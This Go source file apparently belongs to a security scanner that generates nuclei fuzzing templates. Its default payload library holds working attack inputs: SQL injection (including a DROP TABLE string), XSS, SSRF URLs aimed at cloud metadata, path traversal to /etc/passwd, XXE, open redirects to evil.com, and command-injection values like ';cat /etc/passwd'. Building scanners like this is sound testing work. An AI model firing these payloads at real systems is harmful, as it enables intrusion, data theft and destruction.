// Package fuzzorch provides automatic fuzzing orchestration for nuclei.
// It generates fuzzing templates from discovery results (discovered parameters,
// forms, endpoints) and tech profiles, then runs nuclei with those templates.
// This bridges the gap between reconnaissance (pkg/discovery) and the existing
// fuzzing engine (pkg/fuzz) — automatically targeting discovered parameters
// with tech-appropriate payloads.
package fuzzorch

import (
	"fmt"
	"strings"
	"sync"
	"time"
)

// FuzzTarget represents a single fuzzable endpoint with parameters
type FuzzTarget struct {
	URL        string   `json:"url"`
	Method     string   `json:"method"`
	Params     []Param  `json:"params"`
	Headers    map[string]string `json:"headers,omitempty"`
	BodyFormat string   `json:"body_format,omitempty"` // json, form, xml
	BodyData   string   `json:"body_data,omitempty"`
}

// Param represents a fuzzable parameter
type Param struct {
	Name     string `json:"name"`
	Position string `json:"position"` // query, body, header, cookie, path
	Type     string `json:"type"`     // string, number, email, etc.
	Value    string `json:"value"`    // current/observed value
}

// FuzzPayloadSet defines payloads for a specific vulnerability class
type FuzzPayloadSet struct {
	Name     string   `json:"name"`
	VulnType string   `json:"vuln_type"` // sqli, xss, ssrf, lfi, rce, redirect
	Payloads []string `json:"payloads"`
}

// PayloadLibrary holds tech-aware payload sets
type PayloadLibrary struct {
	mu      sync.RWMutex
	payloads map[string]*FuzzPayloadSet // keyed by vuln type
}

// NewPayloadLibrary creates a library with default payloads
func NewPayloadLibrary() *PayloadLibrary {
	lib := &PayloadLibrary{
		payloads: make(map[string]*FuzzPayloadSet),
	}
	lib.loadDefaults()
	return lib
}

// GetPayloads returns payloads for a vuln type
func (l *PayloadLibrary) GetPayloads(vulnType string) *FuzzPayloadSet {
	l.mu.RLock()
	defer l.mu.RUnlock()
	return l.payloads[strings.ToLower(vulnType)]
}

// AllPayloadSets returns all loaded payload sets
func (l *PayloadLibrary) AllPayloadSets() []*FuzzPayloadSet {
	l.mu.RLock()
	defer l.mu.RUnlock()
	var sets []*FuzzPayloadSet
	for _, ps := range l.payloads {
		sets = append(sets, ps)
	}
	return sets
}

// AddPayloadSet adds or replaces a payload set
func (l *PayloadLibrary) AddPayloadSet(ps *FuzzPayloadSet) {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.payloads[strings.ToLower(ps.VulnType)] = ps
}

// SelectPayloadTypes chooses which vuln types to fuzz based on tech profile
func (l *PayloadLibrary) SelectPayloadTypes(technologies []string) []string {
	var selected []string
	techLower := strings.ToLower(strings.Join(technologies, " "))

	// Always include these
	selected = append(selected, "sqli", "xss", "lfi")

	// Tech-specific
	if strings.Contains(techLower, "php") || strings.Contains(techLower, "mysql") {
		selected = append(selected, "sqli-mysql")
	}
	if strings.Contains(techLower, "java") || strings.Contains(techLower, "spring") || strings.Contains(techLower, "tomcat") {
		selected = append(selected, "ssrf", "rce")
	}
	if strings.Contains(techLower, "node") || strings.Contains(techLower, "express") {
		selected = append(selected, "ssrf")
	}
	if strings.Contains(techLower, "asp") || strings.Contains(techLower, "iis") {
		selected = append(selected, "redirect")
	}
	if strings.Contains(techLower, "python") || strings.Contains(techLower, "django") || strings.Contains(techLower, "flask") {
		selected = append(selected, "ssrf")
	}
	if strings.Contains(techLower, "ruby") || strings.Contains(techLower, "rails") {
		selected = append(selected, "ssrf")
	}

	// Deduplicate
	seen := make(map[string]bool)
	var result []string
	for _, s := range selected {
		if !seen[s] {
			seen[s] = true
			result = append(result, s)
		}
	}
	return result
}

func (l *PayloadLibrary) loadDefaults() {
	// SQLi payloads
	l.payloads["sqli"] = &FuzzPayloadSet{
		Name:     "SQL Injection",
		VulnType: "sqli",
		Payloads: []string{
			"'",
			"''",
			"' OR '1'='1",
			"' OR '1'='1' -- -",
			"1' AND SLEEP(3)-- -",
			"1; WAITFOR DELAY '0:0:3'-- -",
			"' UNION SELECT NULL,NULL,NULL-- -",
			"admin'--",
			"1 OR 1=1",
			"'; DROP TABLE users-- -",
		},
	}

	// MySQL-specific SQLi
	l.payloads["sqli-mysql"] = &FuzzPayloadSet{
		Name:     "MySQL SQLi",
		VulnType: "sqli-mysql",
		Payloads: []string{
			"' AND SLEEP(3)-- -",
			"' AND BENCHMARK(5000000,MD5('a'))-- -",
			"' UNION SELECT @@version,NULL-- -",
			"' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -",
		},
	}

	// XSS payloads
	l.payloads["xss"] = &FuzzPayloadSet{
		Name:     "Cross-Site Scripting",
		VulnType: "xss",
		Payloads: []string{
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"<svg onload=alert(1)>",
			"javascript:alert(1)",
			"\"><script>alert(1)</script>",
			"'><script>alert(1)</script>",
			"<body onload=alert(1)>",
			"<iframe src=javascript:alert(1)>",
			"{{constructor.constructor('alert(1)')()}}",
			"<details ontoggle=alert(1) open>",
		},
	}

	// SSRF payloads
	l.payloads["ssrf"] = &FuzzPayloadSet{
		Name:     "Server-Side Request Forgery",
		VulnType: "ssrf",
		Payloads: []string{
			"http://127.0.0.1",
			"http://localhost",
			"http://169.254.169.254/latest/meta-data/",
			"http://169.254.169.254/computeMetadata/v1/",
			"http://metadata.google.internal/",
			"http://[::1]",
			"http://0.0.0.0",
			"http://127.0.0.1:22",
			"http://127.0.0.1:80",
			"http://127.0.0.1:443",
			"gopher://127.0.0.1:25/_HELO%20test",
			"file:///etc/passwd",
			"dict://127.0.0.1:11211/stat",
		},
	}

	// LFI / Path Traversal
	l.payloads["lfi"] = &FuzzPayloadSet{
		Name:     "Path Traversal / LFI",
		VulnType: "lfi",
		Payloads: []string{
			"../../../etc/passwd",
			"../../../../etc/passwd",
			"../../../../../etc/passwd",
			"....//....//....//etc/passwd",
			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			"..%252f..%252f..%252fetc%252fpasswd",
			"/etc/passwd",
			"C:\\Windows\\win.ini",
			"..\\..\\..\\windows\\win.ini",
			"php://filter/convert.base64-encode/resource=index.php",
			"file:///etc/passwd",
			"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
		},
	}

	// RCE / Command Injection
	l.payloads["rce"] = &FuzzPayloadSet{
		Name:     "Command Injection",
		VulnType: "rce",
		Payloads: []string{
			";id",
			"|id",
			"`id`",
			"$(id)",
			";whoami",
			"|whoami",
			"&&whoami",
			";cat /etc/passwd",
			"|cat /etc/passwd",
			";sleep 5",
			"|sleep 5",
			"$(sleep 5)",
			"&&sleep 5",
			";ping -c 3 127.0.0.1",
			"|ping -c 3 127.0.0.1",
		},
	}

	// Open Redirect
	l.payloads["redirect"] = &FuzzPayloadSet{
		Name:     "Open Redirect",
		VulnType: "redirect",
		Payloads: []string{
			"https://evil.com",
			"//evil.com",
			"/\\evil.com",
			"https:evil.com",
			"//google.com/evil.com",
			"javascript:alert(1)",
			"https://evil.com@example.com",
			"//evil.com\\@example.com",
		},
	}

	// XXE
	l.payloads["xxe"] = &FuzzPayloadSet{
		Name:     "XML External Entity",
		VulnType: "xxe",
		Payloads: []string{
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>`,
		},
	}
}

// FuzzResult represents a finding from fuzzing
type FuzzResult struct {
	Target      string  `json:"target"`
	Param       string  `json:"param"`
	VulnType    string  `json:"vuln_type"`
	Payload     string  `json:"payload"`
	Confidence  float64 `json:"confidence"`
	Evidence    string  `json:"evidence"`
	TemplateID  string  `json:"template_id"`
	Timestamp   time.Time `json:"timestamp"`
}

// FuzzStats holds statistics from a fuzzing run
type FuzzStats struct {
	TotalTargets  int            `json:"total_targets"`
	TotalParams   int            `json:"total_params"`
	TotalRequests int            `json:"total_requests"`
	Findings      int            `json:"findings"`
	ByVulnType    map[string]int `json:"by_vuln_type"`
	Duration      string         `json:"duration"`
}

// NewFuzzStats creates an initialized FuzzStats
func NewFuzzStats() *FuzzStats {
	return &FuzzStats{
		ByVulnType: make(map[string]int),
	}
}

func (s *FuzzStats) AddFinding(vulnType string) {
	s.Findings++
	s.ByVulnType[vulnType]++
}

func (s *FuzzStats) String() string {
	var b strings.Builder
	fmt.Fprintf(&b, "Targets: %d, Params: %d, Requests: %d, Findings: %d", s.TotalTargets, s.TotalParams, s.TotalRequests, s.Findings)
	if len(s.ByVulnType) > 0 {
		b.WriteString(" [")
		first := true
		for vt, count := range s.ByVulnType {
			if !first {
				b.WriteString(", ")
			}
			fmt.Fprintf(&b, "%s=%d", vt, count)
			first = false
		}
		b.WriteString("]")
	}
	if s.Duration != "" {
		fmt.Fprintf(&b, " (%s)", s.Duration)
	}
	return b.String()
}
